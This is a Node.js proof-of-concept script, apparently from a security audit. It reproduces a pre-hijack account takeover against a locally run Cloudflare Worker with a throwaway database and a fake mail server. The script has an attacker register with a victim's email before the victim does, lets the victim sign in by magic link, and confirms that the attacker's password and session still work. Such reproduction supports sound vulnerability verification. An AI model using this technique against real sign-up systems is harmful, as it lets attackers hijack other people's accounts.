// A1 (pre-hijack account takeover) on the REAL bundled Worker under workerd with a throw-away D1 and a fake mail server.
// Story: an attacker registers with the victim's e-mail address BEFORE the victim ever signs up; the victim later signs in
// with a magic link; both end up in the SAME account and the attacker's password keeps working.
import http from 'node:http';
import { readFile, mkdtemp } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
const OPS = process.argv[2];
const { Miniflare } = await import(join(OPS, 'workers/revenueops/node_modules/miniflare/dist/src/index.js'));
const source = await readFile(join(OPS, '.local/api-worker.mjs'), 'utf8');
const mails = [];
const mailSrv = http.createServer((req, res) => { let b = ''; req.on('data', d => b += d); req.on('end', () => { mails.push(JSON.parse(b || '{}')); res.setHeader('content-type', 'application/json'); res.end('{"ok":true}'); }); });
await new Promise(r => mailSrv.listen(0, '127.0.0.1', r));
const mf = new Miniflare({ telemetry: { enabled: false }, resourcePersistencePath: join(await mkdtemp(join(tmpdir(), 'audit-auth-')), 'state'),
  workers: [{ config: { name: 'audit-auth', compatibilityDate: '2026-10-15',
    manifest: { mainModule: 'worker.js', modules: { 'worker.js': { type: 'esm', contents: source } } },
    env: { iai_flow_db: { type: 'd1', id: 'audit-auth' }, MAGIC_LINK_SECRET: { type: 'text', value: 'repro-magic-secret' },
      MAIL_API_KEY: { type: 'text', value: 'k' }, MAIL_API_BASE_URL: { type: 'text', value: `http://127.0.0.1:${mailSrv.address().port}` },
      API_ORIGIN: { type: 'text', value: 'https://api.example.test' }, APP_ORIGIN: { type: 'text', value: 'https://app.example.test' },
      APP_DOMAIN: { type: 'text', value: 'api.example.test' }, COOKIE_SECURE: { type: 'text', value: 'true' } } } }] });
const out = {};
try {
  const db = await mf.getD1Database('iai_flow_db');
  for (const s of [
    `CREATE TABLE users (id TEXT PRIMARY KEY, email TEXT NOT NULL UNIQUE, name TEXT, password TEXT NOT NULL DEFAULT '', password_hash TEXT, username TEXT, avatar_url TEXT, bio TEXT, role TEXT NOT NULL DEFAULT 'member', is_verified INTEGER DEFAULT 0, password_salt TEXT, password_algo TEXT, status TEXT NOT NULL DEFAULT 'active', created_at TEXT, updated_at TEXT)`,
    `CREATE TABLE sessions (token TEXT PRIMARY KEY, user_id TEXT, created_at INTEGER, expires_at INTEGER)`,
    `CREATE TABLE rate_limits (key TEXT PRIMARY KEY, hits INTEGER NOT NULL DEFAULT 0, reset_at INTEGER NOT NULL, updated_at INTEGER NOT NULL)`,
    `CREATE TABLE n8n_connections (id INTEGER PRIMARY KEY, n8n_base_url TEXT, is_active INTEGER)`,
    `CREATE TABLE n8n_webhooks (id INTEGER PRIMARY KEY, flow_id TEXT, webhook_url TEXT, trigger_event TEXT, is_active INTEGER, connection_id INTEGER)`,
  ]) await db.prepare(s).run();
  const call = (path, init = {}) => mf.dispatchFetch('https://local' + path, { redirect: 'manual', ...init });
  const json = (path, body, headers = {}) => call(path, { method: 'POST', headers: { 'content-type': 'application/json', ...headers }, body: JSON.stringify(body) });
  const cookieOf = r => (r.headers.get('set-cookie') || '').split(';')[0];

  // 1. attacker registers with the VICTIM's address (no proof of ownership is asked)
  const reg = await json('/api/register', { email: 'victim@example.com', name: 'attacker', password: 'Atk#12345' });
  const regBody = await reg.json(); const attackerCookie = cookieOf(reg);
  out.step1_attacker_registers_with_victim_email = { status: reg.status, user_id: regBody.data?.id };
  // 2. the real owner later asks for a magic link
  const ml = await json('/api/auth/magic-link/request', { email: 'victim@example.com' });
  await new Promise(r => setTimeout(r, 500));
  const mail = mails.find(m => /magic-link\/verify\?token=/.test((m.html || '') + (m.text || '')));
  const token = ((mail?.html || '') + (mail?.text || '')).match(/magic-link\/verify\?token=([^"'<\s&]+)/)?.[1];
  out.step2_victim_requests_magic_link = { status: ml.status, mail_to: mail?.to, link_found: Boolean(token) };
  // 3. the owner clicks the link
  const ver = await call('/api/auth/magic-link/verify?token=' + token);
  const victimCookie = cookieOf(ver);
  const meVictim = await (await call('/api/me', { headers: { Cookie: victimCookie } })).json();
  out.step3_victim_signs_in = { status: ver.status, session_user_id: meVictim.data?.id, same_account_as_attacker: meVictim.data?.id === regBody.data?.id };
  // 4. the attacker keeps full access
  const meAttackerOld = await call('/api/me', { headers: { Cookie: attackerCookie } });
  const relogin = await json('/api/login', { email: 'victim@example.com', password: 'Atk#12345' }, { 'CF-Connecting-IP': '203.0.113.50' });
  out.step4_attacker_still_has_access = { old_session_status: meAttackerOld.status, password_login_status: relogin.status };
} finally { await mf.dispose(); mailSrv.close(); }
console.log(JSON.stringify(out, null, 2));
